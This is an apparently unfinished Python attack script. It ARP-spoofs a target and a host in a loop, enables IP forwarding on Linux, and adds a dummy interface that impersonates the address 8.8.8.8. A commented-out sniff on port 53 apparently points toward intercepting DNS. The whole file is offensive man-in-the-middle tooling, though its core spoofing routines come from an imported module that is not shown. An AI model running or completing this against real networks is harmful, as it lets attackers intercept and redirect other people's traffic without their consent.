import time
import os
import sys
import spoofer
import _thread



def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distros
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def thread_spoof(target, host):
    target_mac = spoofer.get_mac(target)
    host_mac = spoofer.get_mac(host)
    while True:
        spoofer.spoof(target, host, target_mac)
        spoofer.spoof(host, target, host_mac)
        time.sleep(1)


def argParser():
    #WIP
    return


def main():
    target = sys.argv[1]
    host = sys.argv[2]

    print("Starting ARP spoofer thread...")
    _thread.start_new_thread(thread_spoof, (target, host))
    print("Success!")

    bash = "modprobe dummy && " \
           "ip link add eth10 type dummy && " \
           "ip addr add 8.8.8.8/32 dev eth10 label eth10:0 && " \
           "ip -6 addr add fddc:867d:e21d:0:0:0:0:1/64  dev eth10 label eth10:0"
    os.system(bash)

    try:
        while True:
            #WIP
            #pkts = sniff(count=1, filter="host 8.8.8.8 or host " + target + " and  port 53")
            #print(pkts)
            pass
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        bash = "ip link delete eth10 type dummy"
        os.system(bash)
        spoofer.restore(target, host)
        spoofer.restore(host, target)


if __name__ == '__main__':
    if "nt" in os.name:
        exit()
    else:
        _enable_linux_iproute()
        main()
